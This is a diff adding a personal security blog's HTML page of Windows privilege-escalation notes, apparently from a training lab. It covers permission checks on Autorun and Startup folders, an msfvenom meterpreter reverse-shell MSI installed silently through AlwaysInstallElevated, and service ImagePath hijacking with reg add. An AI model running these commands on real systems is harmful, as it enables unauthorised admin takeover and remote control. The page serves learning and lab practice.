@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+  <head>
+      <title>CybSec - Fluid, responsive blog theme for Jekyll</title>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+      <meta http-equiv="content-language" content="en-gb" />
+      <meta name="description" content="Fluid, responsive blog theme for Jekyll">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+      <link href="//fonts.googleapis.com/css?family=Open+Sans:400italic,400,300,700|Lora:400,700,400italic" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" type="text/css" href="/undem.github.io/css/main.css" />
+      <link href="atom.xml" type="application/atom+xml" rel="alternate" title="Site ATOM Feed">
+  </head>
+
+  <body>
+    <!--[if lt IE 7]>
+        <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+    <![endif]-->
+
+    <div class="off-canvas">
+      <figure class="avatar">
+        <img src="/undem.github.io/assets/img/avatar.jpg" alt="Picture" title="That's me, Undem.">
+      </figure>
+      <div class="bio">
+          <h1>Hi, I'm Undem.</h1>
+          <p>Hello there</p>
+      </div>
+      <nav>
+        <h6>Follow me on</h6>
+        <ul>
+          
+          
+          <li><a target="_blank" href="https://github.com/undem5">Github</a></li>
+          
+          
+          
+        </ul>
+      </nav>
+    </div>
+
+
+    <div class="site-wrapper">
+
+      <header>
+        <div class="h-wrap">
+          <h1 class="title"><a href="/undem.github.io/" title="Back to Homepage">CybSec</a></h1>
+          <a class="menu-icon" title="Open Bio"><span class="lines"></span></a>
+        </div>
+      </header>
+
+      <main>
+        <section class="single-wrap">
+  <article class="single-content" itemscope itemtype="http://schema.org/BlogPosting">
+    <div class="feat">
+      <h5 class="page-date">
+        <time datetime="2020-05-23T10:00:00+00:00" itemprop="datePublished">
+          23 May 2020
+        </time>
+      </h5>
+    </div>
+    <h1 class="page-title" itemprop="name headline">Windows PrivEsc</h1>
+    <div itemprop="articleBody">
+      <p>Here some of classic examples of windows priv esc (from Windows PrivEsc Arena/TCM)</p>
+
+<h1 id="windows---accesschk">Windows - Accesschk</h1>
+<p>Accesschk is a useful console program for viewing the permissions on files, registry keys, services…
+By combining the option:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nt">-w</span> : write access
+<span class="nt">-u</span> : supress errors
+<span class="nt">-v</span> : verbose</code></pre></figure>
+
+<p>You can find directories in which you have write access with elevated privileges.</p>
+
+<h1 id="windows---autorun">Windows - Autorun</h1>
+<p>Autorun or Startup programs are services managed by the Service Manager</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">C:<span class="se">\P</span>rogram Files<span class="se">\A</span>utorun Program</code></pre></figure>
+
+<p>If the permission for Everyone is FILE_ALL_ACCESS, so you just need to drop your program and wait for the admin to log in.</p>
+
+<h1 id="windows---startup">Windows - Startup</h1>
+<p>This is the same thing as before, checking ACL permission:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">iacls.exe C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rgrams<span class="se">\S</span>tartup</code></pre></figure>
+
+<p>If the output is on full access (F) for BUILTIN\Users, then drop your program to do a reverse shell.
+The target need to be logon as Administrator for the privilege access.</p>
+
+<h1 id="windows---always-installed-elevated">Windows - Always Installed Elevated</h1>
+<p>One good way to know is the Installed Elevated feature is enable is to do:</p>
+
+<p><img src="/undem.github.io/assets/img/vulnuniversity/alwaysinstalled.png" /></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">HKLM: H_KEY_Local_Machine
+HKCU: H_KEY_Current_User</code></pre></figure>
+
+<p>It represents the configuration related to the local machine and to the current user.</p>
+
+<p>So what you need to do is generate a msi package:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=[</span>your ip] <span class="nt">-f</span> msi <span class="nt">-o</span> setup.msi</code></pre></figure>
+
+<p>And on the Windows machine execute it in background:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msiexec /quiet /qn /i C:<span class="se">\t</span>emp<span class="se">\s</span>etup.msi
+/qn: no UI
+/i: normal installation
+/quiet: quiet mode <span class="o">(</span>no user interaction<span class="o">)</span></code></pre></figure>
+
+<h1 id="windows-registry">Windows Registry</h1>
+<p>In order to verify the fullControl privilege on the services, with powershell you can check:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Get-Acl <span class="nt">-Path</span> HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc | fl</code></pre></figure>
+
+<p>Should display: NT AUTHORITY\INTERACTIVE
+That means you can create your custom service, replace the original one and execute it:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc /v ImagePath /d c:<span class="se">\t</span>emp<span class="se">\s</span>ervice.exe /f
+/v ImagePath: path of the service <span class="o">(</span>this is the value<span class="o">)</span>
+/d <span class="k">for </span>the data of the value
+/f  add the registry key without prompting <span class="k">for </span>confirmation</code></pre></figure>
+
+<p>And then you can execute your service:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sc start regsvc</code></pre></figure>
+
+<p><img src="/undem.github.io/assets/img/vulnuniversity/services1.png" />
+<img src="/undem.github.io/assets/img/vulnuniversity/services2.png" /></p>
+
+    </div>
+    <div class="feat share">
+      <a href="http://twitter.com/share" class="popup">
+        <span class="icon-twitter"></span>
+      </a>
+    </div>
+    
+      <a rel="next" href="/undem.github.io/2020/05/23/meterpreter/" id="next">
+        <span class="nav-title nav-title-next">newer</span> &rarr;
+      </a>
+    
+    
+      <a rel="prev" href="/undem.github.io/2020/05/03/vulnuniversity/" id="prev">
+        &larr; <span class="nav-title nav-title-prev">older</span>
+      </a>
+    
+  </article>
+</section>
+
+      </main>
+
+      <footer>
+        <small>Powered by Jekyll - Theme: <a href="https://github.com/m3xm/hikari-for-Jekyll">hikari</a> - &copy; Undem</small>
+      </footer>
+
+    </div>
+    
+
+    <script src="/undem.github.io/js/main.js"></script>
+    
+    
+
+  </body>
+</html>
